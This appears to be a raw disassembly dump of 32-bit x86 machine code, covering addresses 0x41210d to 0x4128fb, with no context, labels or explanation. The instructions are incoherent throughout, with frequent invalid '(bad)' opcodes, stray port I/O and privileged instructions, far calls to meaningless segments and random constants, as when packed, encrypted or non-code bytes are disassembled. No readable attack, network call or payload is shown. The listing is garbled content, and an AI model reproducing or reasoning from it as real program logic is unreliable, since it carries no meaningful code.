  41210d:	bound  esi,QWORD PTR [edx+ebp*4-0x3fc78b16]
  412114:	lea    edi,ds:[ebx]
  412117:	int    0x57
  412119:	xchg   ecx,eax
  41211a:	(bad)  
  41211b:	and    DWORD PTR [esi],ebx
  41211d:	ret    
  41211e:	pop    edi
  41211f:	popf   
  412120:	sbb    eax,0xd2e433a7
  412125:	push   0xf28b344
  41212a:	test   al,0xe0
  41212c:	xchg   esi,eax
  41212d:	inc    edx
  41212e:	add    BYTE PTR [esi],0x4c
  412131:	(bad)  
  412132:	jle    0x41213e
  412134:	pop    ecx
  412135:	push   esp
  412136:	push   edx
  412137:	inc    esp
  412138:	adc    cl,cl
  41213a:	rcr    BYTE PTR [ebp-0xa21da6e],0x82
  412141:	les    edi,FWORD PTR [eax*8+0x389ccbd]
  412148:	adc    al,bh
  41214a:	adc    eax,DWORD PTR [edi]
  41214c:	sbb    al,0xdb
  41214e:	pop    ss
  41214f:	xor    DWORD PTR [ebp+eax*1-0x46],edx
  412153:	mov    esi,0xe422f9a2
  412158:	mov    ebx,0x8a17e48e
  41215d:	in     eax,dx
  41215e:	jnp    0x4120e0
  412160:	scas   al,BYTE PTR es:[edi]
  412161:	(bad)  
  412162:	out    dx,al
  412163:	popa   
  412164:	repz cmp eax,0xff558d5
  41216a:	das    
  41216b:	xchg   ebx,eax
  41216c:	cmp    eax,0xe0305b83
  412171:	(bad)  
  412172:	out    0x6,al
  412174:	imul   esi,DWORD PTR [eax],0xf1eaf724
  41217a:	adc    al,0xa7
  41217c:	mov    al,0xe
  41217e:	xlat   BYTE PTR ds:[ebx]
  41217f:	ret    
  412180:	lahf   
  412181:	stos   BYTE PTR es:[edi],al
  412182:	dec    ebx
  412183:	inc    ebx
  412184:	outs   dx,DWORD PTR ds:[esi]
  412185:	xchg   BYTE PTR [ecx-0x4c],cl
  412188:	lahf   
  412189:	popa   
  41218a:	add    DWORD PTR [eax+0x24],ebp
  41218d:	retf   0x6641
  412190:	push   ebp
  412191:	adc    al,0x5b
  412193:	mov    esp,0xd5612648
  412198:	mov    dl,0x3b
  41219a:	icebp  
  41219b:	inc    ebp
  41219c:	jne    0x412159
  41219e:	call   0x27f0:0x85e45d00
  4121a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a6:	pop    ds
  4121a7:	outs   dx,BYTE PTR ds:[esi]
  4121a8:	jnp    0x41212c
  4121aa:	imul   ebp,DWORD PTR [ebx-0x2d],0x4f
  4121ae:	add    DWORD PTR [ebx*1-0x226bcd1e],esp
  4121b5:	imul   ebp
  4121b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121b8:	cmp    cl,ah
  4121ba:	in     al,0x83
  4121bc:	pop    ebp
  4121bd:	pusha  
  4121be:	out    0xea,al
  4121c0:	stc    
  4121c1:	cmp    bl,cl
  4121c3:	fisttp WORD PTR [edx]
  4121c5:	and    ebp,DWORD PTR [ecx+0xa6f4bdf]
  4121cb:	mov    eax,0xbd572100
  4121d0:	clc    
  4121d1:	pop    es
  4121d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d3:	push   edi
  4121d4:	in     al,dx
  4121d5:	popa   
  4121d6:	outs   dx,DWORD PTR ds:[esi]
  4121d7:	add    eax,0x8fbe7d6
  4121dc:	es pop edx
  4121de:	cmp    al,0x75
  4121e0:	mov    edi,0xfc9cc7c9
  4121e5:	out    0xe3,eax
  4121e7:	mov    ch,0x24
  4121e9:	mov    eax,0x7e28941e
  4121ee:	pop    ss
  4121ef:	mov    dh,0x5a
  4121f1:	or     DWORD PTR [eax+0x24],esi
  4121f4:	lds    ecx,FWORD PTR [edx+esi*8-0x26]
  4121f8:	push   0xffffff83
  4121fa:	mov    dh,0xd7
  4121fc:	cmp    DWORD PTR [eax],esp
  4121fe:	or     BYTE PTR [ebp+edi*4+0x48],bl
  412202:	cli    
  412203:	aas    
  412204:	clc    
  412205:	call   0x819741ef
  41220a:	mov    edi,0x94285c57
  41220f:	aaa    
  412210:	add    DWORD PTR [ebx+0x42],esi
  412213:	add    DWORD PTR [eax],ebp
  412215:	pmaddwd mm6,QWORD PTR [edx]
  412218:	(bad)  
  412219:	hlt    
  41221a:	mov    ch,0x87
  41221c:	adc    BYTE PTR [ebp+0x26262541],ch
  412222:	mov    dh,0x10
  412224:	jge    0x4121ce
  412226:	or     DWORD PTR [edx-0x3c],ebx
  412229:	into   
  41222a:	sbb    al,0x99
  41222c:	cmp    al,BYTE PTR gs:[eax]
  41222f:	mov    ds:0x34415bad,eax
  412234:	imul   ebx,DWORD PTR [esi-0x7a],0xe6c12b1a
  41223b:	imul   edx,eax,0xc7e7f68b
  412241:	call   0x37e78de8
  412246:	cmp    ebp,ebx
  412248:	aam    0xe8
  41224a:	cli    
  41224b:	dec    ebx
  41224c:	ins    BYTE PTR es:[edi],dx
  41224d:	cmc    
  41224e:	adc    edx,esp
  412250:	shr    bh,cl
  412252:	jmp    0x4620e9fb
  412257:	sbb    eax,DWORD PTR [edi-0x67]
  41225a:	add    esp,esp
  41225c:	repnz mov edx,0x29ec90a7
  412262:	sbb    eax,0xf3e8429
  412267:	cmp    eax,DWORD PTR [esi]
  412269:	mov    ebx,0x10e9f1af
  41226e:	std    
  41226f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412270:	rcl    DWORD PTR ds:0xabae99d0,cl
  412276:	fidivr WORD PTR [esi+0x7e]
  412279:	cmp    esp,DWORD PTR [esi-0x74]
  41227c:	mov    eax,0xb07ae918
  412281:	xchg   ecx,eax
  412282:	xchg   DWORD PTR ds:0xb1c05d19,ebx
  412288:	and    dh,BYTE PTR [esi+0x352576d3]
  41228e:	dec    ecx
  41228f:	icebp  
  412290:	xchg   BYTE PTR [eax],al
  412292:	inc    edi
  412293:	sub    DWORD PTR es:[edi+0x273b5d28],esi
  41229a:	(bad)  
  41229b:	jo     0x41226d
  41229d:	sub    ah,BYTE PTR [ecx-0x58]
  4122a0:	pop    es
  4122a1:	daa    
  4122a2:	cli    
  4122a3:	xor    ecx,DWORD PTR [ecx-0x13]
  4122a6:	adc    BYTE PTR [ebp-0x7a],ch
  4122a9:	dec    eax
  4122aa:	dec    esp
  4122ab:	(bad)  
  4122ad:	(bad)  
  4122ae:	idiv   DWORD PTR [ebx]
  4122b0:	sbb    dh,BYTE PTR [eax-0xe]
  4122b3:	mov    edx,0xe2f52ff2
  4122b8:	add    DWORD PTR [eax+0x6],0xffffff88
  4122bc:	add    BYTE PTR [edi-0xc93443c],bl
  4122c2:	stos   DWORD PTR es:[edi],eax
  4122c3:	mov    bh,0x1f
  4122c5:	sbb    al,0x34
  4122c7:	sub    cl,BYTE PTR [esp+edx*4-0x65]
  4122cb:	loop   0x4122d5
  4122cd:	xchg   ecx,eax
  4122ce:	rcl    eax,1
  4122d0:	test   eax,0xc63ea445
  4122d5:	inc    esp
  4122d6:	fimul  WORD PTR [ebp+0x5fb4bfea]
  4122dc:	dec    esp
  4122dd:	test   dl,0x97
  4122e0:	sbb    al,0x66
  4122e2:	ret    
  4122e3:	enter  0xd705,0x7d
  4122e7:	dec    ebx
  4122e8:	(bad)  
  4122ea:	jne    0x4122e3
  4122ec:	ja     0x41234d
  4122ee:	or     DWORD PTR [ebx],0x27
  4122f1:	add    eax,0x99cfb636
  4122f6:	mov    ah,0x48
  4122f8:	xchg   esp,eax
  4122f9:	and    esp,ebp
  4122fb:	xchg   edi,eax
  4122fc:	mov    esp,0x59a8030
  412301:	sbb    BYTE PTR [edx+ebx*1],ch
  412304:	shr    BYTE PTR [esi+eax*1],0xb1
  412308:	lods   eax,DWORD PTR ds:[esi]
  412309:	xchg   ecx,eax
  41230a:	inc    ebp
  41230b:	add    eax,0xae3211d8
  412310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412311:	inc    ebp
  412312:	push   ds
  412313:	dec    esp
  412314:	test   eax,0xcec7978a
  412319:	pop    edx
  41231a:	mov    edx,0x55529124
  41231f:	add    ah,dh
  412321:	cli    
  412322:	call   0xbc4e2567
  412327:	mov    DWORD PTR ds:0x7928cd3,esi
  41232d:	mov    es,WORD PTR [edx]
  41232f:	or     BYTE PTR [ecx+eiz*8+0x2c64be40],0x6f
  412337:	cmp    BYTE PTR [ecx+ebx*4],al
  41233a:	jl     0x41236c
  41233c:	jo     0x4122f5
  41233e:	mov    dh,0xc2
  412340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412341:	inc    ebp
  412342:	loopne 0x4123a6
  412344:	(bad)
  412348:	pop    ebp
  412349:	ror    DWORD PTR [ebx],0xf0
  41234c:	lods   al,BYTE PTR ds:[esi]
  41234d:	push   esp
  41234e:	xor    DWORD PTR [esi-0x76dd8c1e],esi
  412354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412355:	inc    ebp
  412356:	hlt    
  412357:	popf   
  412358:	(bad)  
  412359:	aad    0x4e
  41235b:	ror    BYTE PTR [esi+0x34ddfccc],cl
  412361:	outs   dx,DWORD PTR ds:[esi]
  412362:	add    BYTE PTR [edx-0x5295a5c],al
  412368:	mov    ch,0x19
  41236a:	jne    0x412337
  41236c:	sbb    eax,0x2683eeb5
  412371:	adc    BYTE PTR [ecx+0x6341e13a],0xcd
  412378:	xchg   DWORD PTR [esi+0x3],ebp
  41237b:	mov    ebx,0xf978d9eb
  412380:	xchg   edx,eax
  412381:	out    dx,al
  412382:	outs   dx,BYTE PTR ds:[esi]
  412383:	pop    ds
  412384:	xor    DWORD PTR [edi+ebp*4-0x66c6b6f4],esp
  41238b:	jg     0x4123a1
  41238d:	in     eax,0x24
  41238f:	ret    0x969b
  412392:	jmp    0x412330
  412394:	pop    edi
  412395:	in     al,dx
  412396:	push   0x91d80a1e
  41239b:	jg     0x4123e1
  41239d:	popa   
  41239e:	fist   WORD PTR [edi-0x7]
  4123a1:	mov    ds:0xaa577e20,eax
  4123a6:	push   ss
  4123a7:	call   DWORD PTR [eax]
  4123a9:	or     BYTE PTR [esi+0x2],0x4d
  4123ad:	jl     0x412386
  4123af:	mov    ebp,0x4201c607
  4123b4:	dec    ecx
  4123b5:	sbb    edx,ebx
  4123b7:	retf   0xd6fb
  4123ba:	sbb    eax,0x889bf129
  4123bf:	popf   
  4123c0:	addr16 call 0xfe0961b9
  4123c6:	jle    0x412374
  4123c8:	outs   dx,BYTE PTR ds:[esi]
  4123c9:	push   es
  4123ca:	mov    esi,0xec567c06
  4123cf:	and    eax,0x9655e0f4
  4123d4:	imul   ebp,DWORD PTR [ebx],0x2e
  4123d7:	(bad)  
  4123d8:	retf   0x7412
  4123db:	test   BYTE PTR [ecx-0x31716925],0x29
  4123e2:	add    edx,edx
  4123e4:	jg     0x412416
  4123e6:	pop    ss
  4123e7:	mov    ecx,0x336c1c16
  4123ec:	pop    ss
  4123ed:	sbb    BYTE PTR [edi-0x3d],dl
  4123f0:	xor    BYTE PTR [eax+0x1b],bh
  4123f3:	pop    ebx
  4123f4:	test   BYTE PTR [ecx+0x56e5f037],bl
  4123fa:	enter  0xbb25,0xc5
  4123fe:	ins    DWORD PTR es:[edi],dx
  4123ff:	mov    ecx,0xd4ff4d96
  412404:	jp     0x4123e0
  412406:	xor    al,0xa7
  412408:	(bad)  
  412409:	aas    
  41240a:	dec    esi
  41240b:	(bad)  
  41240c:	mov    bh,0x2c
  41240e:	jl     0x4123eb
  412410:	or     BYTE PTR [esp+ecx*1+0x3f],dl
  412414:	shr    BYTE PTR [edx-0x16],1
  412417:	test   eax,0x1f4a44b3
  41241c:	mov    cl,dl
  41241e:	out    dx,al
  41241f:	loope  0x41242c
  412421:	out    0x60,al
  412423:	ins    BYTE PTR es:[edi],dx
  412424:	xchg   ebx,eax
  412425:	pop    es
  412426:	clc    
  412427:	hlt    
  412428:	push   edi
  412429:	mov    al,ds:0x74c33c38
  41242e:	mov    ch,ah
  412430:	adc    esi,DWORD PTR [ecx+eiz*1+0x1b]
  412434:	fmul   QWORD PTR [ebp-0x29]
  412437:	mov    ds:0xc5d18365,al
  41243c:	and    BYTE PTR [edi-0x40],bh
  41243f:	inc    ebx
  412440:	jmp    0x60783ecd
  412445:	mov    al,0x41
  412447:	or     eax,0x34af5034
  41244c:	enter  0x7ab5,0x87
  412450:	call   0x920ce58d
  412455:	into   
  412456:	inc    ebp
  412457:	xchg   ecx,eax
  412458:	xchg   esi,eax
  412459:	bound  edi,QWORD PTR [edx+edx*4-0x7f]
  41245d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41245e:	push   0x6
  412460:	mov    edi,0x5a366091
  412465:	jl     0x412462
  412467:	int3   
  412468:	lea    esi,[eax-0x20]
  41246b:	pop    ss
  41246c:	xor    eax,ecx
  41246e:	scas   eax,DWORD PTR es:[edi]
  41246f:	dec    esp
  412470:	rcl    BYTE PTR [ecx-0x4471d40f],0xe7
  412477:	and    al,0x52
  412479:	stos   BYTE PTR es:[edi],al
  41247a:	dec    ebp
  41247b:	and    al,0x42
  41247d:	lock xor al,0x62
  412480:	jns    0x412430
  412482:	xchg   edx,eax
  412483:	fs out dx,al
  412485:	or     al,0x68
  412487:	cmc    
  412488:	inc    edx
  412489:	adc    edi,DWORD PTR [eax]
  41248b:	sbb    DWORD PTR [eax+0x7],0x1b7b05f3
  412492:	pop    esi
  412493:	adc    bl,bl
  412495:	es lahf 
  412497:	adc    al,0x9
  412499:	push   0x95d2e15d
  41249e:	add    ebx,DWORD PTR [eax+0x48d02740]
  4124a4:	(bad)  
  4124a5:	lods   al,BYTE PTR ds:[esi]
  4124a6:	jno    0x4124dc
  4124a8:	and    BYTE PTR [ecx+0x19],0xa2
  4124ac:	rcl    DWORD PTR [eax+0x7],1
  4124af:	ror    ecx,cl
  4124b1:	or     DWORD PTR [ecx+0x4b],eax
  4124b4:	sub    al,0xe0
  4124b6:	ss jbe 0x41251a
  4124b9:	ret    0xbfdf
  4124bc:	xor    BYTE PTR ds:0x6e1315,bh
  4124c2:	mov    bh,0xa4
  4124c4:	popf   
  4124c5:	data16 mov dh,0x17
  4124c8:	shl    DWORD PTR [ebp+0x6d],1
  4124cb:	jbe    0x41246b
  4124cd:	test   DWORD PTR [ebx-0x6226458d],ebx
  4124d3:	sbb    eax,0xeb365d18
  4124d8:	xchg   edi,eax
  4124d9:	sahf   
  4124da:	shr    al,cl
  4124dc:	call   0x4901b782
  4124e1:	push   0x8772b176
  4124e6:	bound  ebx,QWORD PTR ds:0xabe83763
  4124ec:	es sahf 
  4124ee:	bound  ecx,QWORD PTR [edx]
  4124f0:	std    
  4124f1:	test   DWORD PTR ss:[di],esi
  4124f5:	xor    al,0x64
  4124f7:	scas   al,BYTE PTR es:[edi]
  4124f8:	and    eax,0xfb261722
  4124fd:	and    DWORD PTR [eax-0x7a],ebx
  412500:	inc    eax
  412501:	imul   esi,DWORD PTR [ebp+0x26dfa11b],0x8ee01384
  41250b:	sbb    esi,ebp
  41250d:	outs   dx,DWORD PTR ds:[esi]
  41250e:	cwde   
  41250f:	shl    BYTE PTR [edx],cl
  412511:	jmp    FWORD PTR [eax+0x123e589b]
  412517:	dec    ecx
  412518:	popf   
  412519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41251a:	pop    ecx
  41251b:	add    BYTE PTR [ecx],bl
  41251d:	icebp  
  41251e:	popa   
  41251f:	ret    
  412520:	pop    ss
  412521:	fild   QWORD PTR ds:0x5226aa05
  412527:	inc    ebx
  412528:	(bad)  
  412529:	aas    
  41252a:	in     eax,dx
  41252b:	scas   eax,DWORD PTR es:[edi]
  41252c:	ins    BYTE PTR es:[edi],dx
  41252d:	pop    ecx
  41252e:	xchg   ecx,eax
  41252f:	inc    esi
  412530:	add    ebp,esp
  412532:	es dec edx
  412534:	mov    ch,0xe9
  412536:	sub    al,0xc3
  412538:	add    ecx,DWORD PTR [esi-0x5bc80502]
  41253e:	mov    ebx,DWORD PTR [ebx-0x41ac1972]
  412544:	or     al,0xd3
  412546:	js     0x412547
  412548:	stos   DWORD PTR es:[edi],eax
  412549:	ror    BYTE PTR [ebx],cl
  41254b:	mov    cl,0xe8
  41254d:	inc    ebx
  41254e:	xchg   BYTE PTR [eax],cl
  412550:	jp     0x412579
  412552:	into   
  412553:	repz imul ecx,DWORD PTR [ebp+0xe868eb2],0xffffffe5
  41255b:	pushf  
  41255c:	jmp    0x412574
  41255e:	add    DWORD PTR [edi],eax
  412560:	add    BYTE PTR [ebx+esi*2+0x53940b7e],ch
  412567:	sbb    eax,0x3c77a44f
  41256c:	(bad)  
  41256d:	sub    bl,bh
  41256f:	fwait
  412570:	hlt    
  412571:	add    al,0x60
  412573:	mov    eax,ds:0x4359e2f3
  412578:	mov    cl,0xb5
  41257a:	pop    DWORD PTR [edi+0xb]
  41257d:	jg     0x4125d7
  41257f:	in     eax,dx
  412580:	sbb    bh,ah
  412582:	test   BYTE PTR [ebp-0x21a17641],ch
  412588:	and    eax,0xb0dc6fb5
  41258d:	pop    edi
  41258e:	sbb    al,BYTE PTR [eax+ebp*1]
  412591:	add    al,0xb1
  412593:	je     0x412593
  412595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412596:	push   es
  412597:	in     al,dx
  412598:	pop    eax
  412599:	sbb    eax,0x76a6ac9
  41259e:	cld    
  41259f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a0:	nop
  4125a1:	xchg   edx,eax
  4125a2:	fild   DWORD PTR [ebx]
  4125a4:	mov    ah,0x37
  4125a6:	lock push esi
  4125a8:	jmp    DWORD PTR [edx]
  4125aa:	rcr    eax,1
  4125ac:	jo     0x412606
  4125ae:	pop    es
  4125af:	fisttp WORD PTR [edx]
  4125b1:	pop    es
  4125b2:	lods   al,BYTE PTR ds:[esi]
  4125b3:	jg     0x41253a
  4125b5:	cmp    DWORD PTR [edx-0x55],0x9133e23a
  4125bc:	mov    WORD PTR ds:0x931cc3a7,fs
  4125c2:	push   0x45fb930
  4125c7:	jmp    0x1383:0x28dcff0e
  4125ce:	dec    edx
  4125cf:	push   esi
  4125d0:	cld    
  4125d1:	jae    0x41262c
  4125d3:	fld    st(4)
  4125d5:	arpl   WORD PTR [eax-0x20fd3606],sp
  4125db:	push   0xffffff98
  4125dd:	ret    0x9c09
  4125e0:	ins    BYTE PTR es:[edi],dx
  4125e1:	out    0x64,al
  4125e3:	pop    esp
  4125e4:	and    ch,BYTE PTR [edx-0x1c3ef30]
  4125ea:	cs sub esp,edi
  4125ed:	scas   eax,DWORD PTR es:[edi]
  4125ee:	es out dx,eax
  4125f0:	aaa    
  4125f1:	mov    bl,0xb7
  4125f3:	sar    DWORD PTR [edi-0x796a4ad7],cl
  4125f9:	test   eax,0x6e563542
  4125fe:	xor    eax,ebp
  412600:	iret   
  412601:	mov    eax,0x667365a2
  412606:	or     eax,0x54645f48
  41260b:	dec    esp
  41260c:	(bad)  [esi+0x34b8fbb2]
  412612:	loopne 0x4125de
  412614:	mov    ebx,0xd49a5ce4
  412619:	call   0x3c92:0x9ecdc3c1
  412620:	adc    BYTE PTR [edi],cl
  412622:	test   BYTE PTR [ecx],dl
  412624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412625:	cmp    al,0x44
  412627:	push   eax
  412628:	pop    es
  412629:	jmp    0xdd80b4b
  41262e:	repnz push ebp
  412630:	jne    0x41260f
  412632:	adc    eax,0xe8346b7a
  412637:	idiv   ebp
  412639:	jecxz  0x412631
  41263b:	pop    edi
  41263c:	add    al,0x35
  41263e:	outs   dx,DWORD PTR ds:[esi]
  41263f:	pop    ecx
  412640:	push   edx
  412641:	rcl    DWORD PTR [edx+ebx*2-0x40158a8a],cl
  412648:	mov    esi,0x255d9e36
  41264d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41264e:	dec    edi
  41264f:	scas   al,BYTE PTR es:[edi]
  412650:	jge    0x412679
  412652:	xchg   esp,eax
  412653:	scas   al,BYTE PTR es:[edi]
  412654:	sub    al,0xeb
  412656:	sbb    al,0xd0
  412658:	cs sahf 
  41265a:	jbe    0x412655
  41265c:	push   ss
  41265d:	pop    ecx
  41265e:	(bad)  
  41265f:	enter  0xcab0,0x5a
  412663:	daa    
  412664:	aad    0xbb
  412666:	mov    ebp,ecx
  412668:	add    esi,DWORD PTR [eax+edx*2]
  41266b:	and    edx,DWORD PTR [ebx+edx*4]
  41266e:	dec    ebp
  41266f:	inc    edi
  412670:	pop    ecx
  412671:	push   0x5b5417cd
  412676:	inc    DWORD PTR [edx]
  412678:	mov    eax,0x2af4ec38
  41267d:	inc    edx
  41267e:	cmp    dh,ah
  412680:	mov    esi,0x40351b29
  412685:	push   0xffffffef
  412687:	ret    
  412688:	sbb    eax,0xfd4ff23
  41268d:	mov    bl,0x73
  41268f:	cs dec edi
  412691:	outs   dx,DWORD PTR ds:[esi]
  412692:	(bad)  
  412694:	xor    ecx,ebx
  412696:	lock fcom QWORD PTR [edi-0x6d]
  41269a:	adc    edx,ebp
  41269c:	xor    al,0xed
  41269e:	imul   edi,DWORD PTR es:[ebp-0xe1b08f],0x70809e44
  4126a9:	xor    eax,esi
  4126ab:	int    0xdc
  4126ad:	sub    eax,0xc7f60d13
  4126b2:	sub    eax,0x68c56002
  4126b7:	inc    eax
  4126b8:	push   edi
  4126b9:	mov    ebx,0x2e4c94e8
  4126be:	mov    edi,0xabd2a885
  4126c3:	fld    DWORD PTR [edi]
  4126c5:	jp     0x41265f
  4126c7:	js     0x412736
  4126c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ca:	leave  
  4126cb:	pop    ecx
  4126cc:	(bad)  
  4126cd:	jecxz  0x4126be
  4126cf:	jl     0x41265e
  4126d1:	and    bl,bh
  4126d3:	pop    ecx
  4126d4:	jle    0x41272e
  4126d6:	sbb    edx,DWORD PTR [edi-0xd]
  4126d9:	ja     0x41269a
  4126db:	sbb    esp,DWORD PTR [edx+ecx*1+0x4e95f3f7]
  4126e2:	ret    
  4126e3:	rcl    BYTE PTR [edx],1
  4126e5:	push   cs
  4126e6:	ins    BYTE PTR es:[edi],dx
  4126e7:	mov    ch,0x60
  4126e9:	mov    eax,0x5442bfe7
  4126ee:	dec    ecx
  4126ef:	xor    al,bh
  4126f1:	push   ebp
  4126f2:	cmpxchg DWORD PTR [ecx-0x1f],ebp
  4126f6:	push   cs
  4126f7:	cmc    
  4126f8:	popa   
  4126f9:	pusha  
  4126fa:	dec    ecx
  4126fb:	xor    eax,0x3890e391
  412700:	or     ecx,ecx
  412702:	add    al,0x80
  412704:	push   ebp
  412705:	cwde   
  412706:	loope  0x4126a9
  412708:	call   0xfe6892f2
  41270d:	mov    dh,0x4f
  41270f:	gs push 0x11
  412712:	fs push 0x1f0477dd
  412718:	jbe    0x4126b4
  41271a:	sub    BYTE PTR [edi],bl
  41271c:	clc    
  41271d:	pop    edi
  41271e:	out    dx,eax
  41271f:	push   cs
  412720:	push   eax
  412721:	inc    esi
  412722:	xchg   ecx,eax
  412723:	mov    eax,0xcfe87d89
  412728:	pushf  
  412729:	dec    edi
  41272a:	mov    eax,ds:0xe2c859d6
  41272f:	test   DWORD PTR [esi+0x50],eax
  412732:	(bad)  
  412733:	retf   
  412734:	lds    esp,FWORD PTR [ecx+edx*4-0xc]
  412738:	popa   
  412739:	and    al,0xa9
  41273b:	sar    DWORD PTR [eax-0x61],cl
  41273e:	xlat   BYTE PTR ds:[ebx]
  41273f:	pop    ds
  412740:	adc    BYTE PTR [esi+esi*1-0x2c],dl
  412744:	cmp    BYTE PTR [ecx+0x1b5de9d1],dh
  41274a:	mov    ecx,DWORD PTR [ebx+0x1927f471]
  412750:	mov    ah,0x80
  412752:	lods   eax,DWORD PTR ds:[esi]
  412753:	je     0x4127a8
  412755:	mov    eax,0x7c111433
  41275a:	mov    ecx,edi
  41275c:	push   esi
  41275d:	imul   esi,DWORD PTR [eax-0x5c],0xfffffffe
  412761:	sti    
  412762:	nop
  412763:	mov    ebp,0xd328884b
  412768:	xlat   BYTE PTR ds:[ebx]
  412769:	idiv   DWORD PTR [edx+0xee3547a]
  41276f:	int    0x8d
  412771:	jno    0x412798
  412773:	add    ah,BYTE PTR [eax]
  412775:	sub    al,ch
  412777:	aas    
  412778:	mov    ebp,0xf30d15d3
  41277d:	jbe    0x4127d1
  41277f:	es pop ebx
  412782:	xor    al,BYTE PTR [edx-0x6999d280]
  412788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412789:	sub    al,0x3d
  41278b:	push   eax
  41278c:	mov    esp,ss
  41278e:	ss rcr edi,0xf7
  412792:	rcr    BYTE PTR [ebp-0x5d831d87],cl
  412798:	cs in  al,dx
  41279a:	aad    0xea
  41279c:	inc    esi
  41279d:	pop    esp
  41279e:	repnz hlt 
  4127a0:	rcr    bh,1
  4127a2:	pop    ss
  4127a3:	inc    ebp
  4127a4:	in     al,0x9a
  4127a6:	jbe    0x41278f
  4127a8:	les    ecx,FWORD PTR [ecx-0x11]
  4127ab:	or     DWORD PTR [esi+0x31],0x60da1605
  4127b2:	add    eax,0xf307b241
  4127b7:	cs call 0x7e4b:0x79281885
  4127bf:	pop    esi
  4127c0:	jg     0x412791
  4127c2:	add    eax,DWORD PTR [ecx]
  4127c4:	dec    esi
  4127c5:	jmp    0x412777
  4127c7:	dec    esp
  4127c8:	push   esi
  4127c9:	data16 mov al,0xca
  4127cc:	div    BYTE PTR ds:0x3b7372ef
  4127d2:	and    eax,0x7a153be
  4127d7:	sti    
  4127d8:	bound  ebp,QWORD PTR [eax-0x4bc1135f]
  4127de:	repz or eax,0x9d8ff74f
  4127e4:	pop    esi
  4127e6:	adc    ah,ah
  4127e8:	add    al,0x4d
  4127ea:	push   0x19
  4127ec:	out    0xf6,al
  4127ee:	aad    0xc1
  4127f0:	in     eax,dx
  4127f1:	xor    bh,0x1f
  4127f4:	ins    DWORD PTR es:[edi],dx
  4127f5:	test   BYTE PTR [edi+edi*4+0x5f41e738],dl
  4127fc:	ds inc esp
  4127fe:	test   eax,0x7a3f5500
  412803:	nop
  412804:	sti    
  412805:	xor    DWORD PTR [esi+esi*8],0x381994b4
  41280c:	stos   BYTE PTR es:[edi],al
  41280d:	mov    edi,eax
  41280f:	test   DWORD PTR [esi],eax
  412811:	xor    ch,BYTE PTR [eax]
  412813:	or     BYTE PTR [edi],0x10
  412816:	xchg   di,ax
  412818:	in     eax,0x76
  41281a:	dec    eax
  41281b:	inc    esi
  41281c:	pop    ebp
  41281d:	popa   
  41281e:	dec    ecx
  41281f:	mov    ds:0xaa782674,al
  412824:	sbb    al,0x56
  412826:	mul    BYTE PTR [esi]
  412828:	je     0x412817
  41282a:	cwde   
  41282b:	sub    BYTE PTR [esi],ch
  41282d:	inc    esp
  41282e:	cli    
  41282f:	mov    ah,0xf6
  412831:	mov    WORD PTR [edx+0x25],ss
  412834:	pop    edx
  412835:	adc    eax,0xd6a439ae
  41283a:	jae    0x412894
  41283c:	enter  0xd388,0xc7
  412840:	xchg   BYTE PTR [ebx+0x5b678a39],bh
  412846:	retf   0x1465
  412849:	and    BYTE PTR [esi],0xec
  41284c:	in     eax,0xb
  41284e:	sub    BYTE PTR [esi],dh
  412850:	mov    ecx,0x5370dcad
  412855:	pop    es
  412856:	and    eax,0x549900aa
  41285b:	push   edx
  41285c:	test   eax,0x3b79935d
  412861:	dec    bl
  412863:	jns    0x41288f
  412865:	mov    ch,0x1c
  412867:	data16 lock sahf 
  41286a:	lea    ebp,[ebx]
  41286c:	xchg   ebp,eax
  41286d:	call   0xfb8b:0xb0c94a5c
  412874:	sbb    edx,DWORD PTR [ecx+0x24]
  412877:	je     0x4128cf
  412879:	ss nop
  41287b:	out    dx,eax
  41287c:	or     eax,0x7f6ead99
  412881:	in     eax,0xf3
  412883:	test   BYTE PTR [bp+di-0xf0c],dl
  412888:	and    dh,BYTE PTR [edi-0xcd7ce7f]
  41288e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41288f:	aaa    
  412890:	sub    ah,ah
  412892:	hlt    
  412893:	mov    dh,0xb4
  412895:	lock dec edx
  412897:	daa    
  412898:	int3   
  412899:	ja     0x412903
  41289b:	pusha  
  41289c:	sbb    BYTE PTR [edi],0x5b
  41289f:	aam    0x30
  4128a1:	(bad)  
  4128a2:	jmp    0x4128de
  4128a4:	clc    
  4128a5:	cwde   
  4128a6:	sahf   
  4128a7:	cli    
  4128a8:	std    
  4128a9:	push   es
  4128aa:	cmp    BYTE PTR [ebx-0x70],dl
  4128ad:	sub    ecx,DWORD PTR [ebx+0x7c27b461]
  4128b3:	popf   
  4128b4:	adc    ebp,0x6d33dec9
  4128ba:	jae    0x41290b
  4128bc:	loope  0x412929
  4128be:	outs   dx,DWORD PTR ds:[esi]
  4128bf:	mov    cl,0x14
  4128c1:	jae    0x4128f3
  4128c3:	jp     0x412913
  4128c5:	add    edx,DWORD PTR [eax-0x64ebadb5]
  4128cb:	add    DWORD PTR [edi+0x64e541ac],esp
  4128d1:	scas   eax,DWORD PTR es:[edi]
  4128d2:	mov    edx,0xc741b9b9
  4128d7:	(bad)  
  4128d8:	std    
  4128d9:	inc    eax
  4128da:	les    edx,FWORD PTR [ebp+0x55]
  4128dd:	sbb    eax,0xa1d22d4c
  4128e2:	mov    ch,0xf2
  4128e4:	pop    ebx
  4128e5:	push   edi
  4128e6:	pop    edx
  4128e7:	sbb    edx,ebp
  4128e9:	pop    es
  4128ea:	add    BYTE PTR [edx],al
  4128ec:	call   DWORD PTR [ebp+0x4c]
  4128ef:	pop    esp
  4128f0:	ret    
  4128f1:	push   ss
  4128f2:	or     cl,ch
  4128f4:	mov    WORD PTR ds:0x965babec,cs
  4128fa:	aaa    
  4128fb:	aas    
